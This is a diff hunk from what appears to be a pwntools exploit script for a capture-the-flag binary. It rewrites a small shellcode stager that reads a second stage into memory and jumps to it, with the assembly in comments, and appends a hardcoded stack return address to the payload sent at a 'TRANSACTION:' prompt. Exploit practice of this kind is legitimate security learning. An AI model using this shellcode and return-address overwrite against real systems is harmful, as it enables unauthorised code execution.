@@ -88,12 +88,14 @@ p.sendline('5')
 print(p.readuntil('TRANSACTION:'))
 
 # mov edi, 0
-# mov rsi, 0x7fffffffed50
+# lea rsi, [r11-0x48]
 # mov edx, 0x20
+# xor eax, eax
 # syscall
 # jmp rsi
-router = "\xBF\x00\x00\x00\x00\x48\xBE\x50\xED\xFF\xFF\xFF\x7F\x00\x00\xBA\x20\x00\x00\x00\x0F\x05\xFF\xE6"
+router = "\xBF\x00\x00\x00\x00\x49\x8D\x73\xB8\xBA\x20\x00\x00\x00\x31\xC0\x0F\x05\xFF\xE6" + "\x90"*4
 router += p64(0x00007fffffffedd0)
+# 0x7fffffffedd0
 p.sendline(router)
 
 print(p.readline())
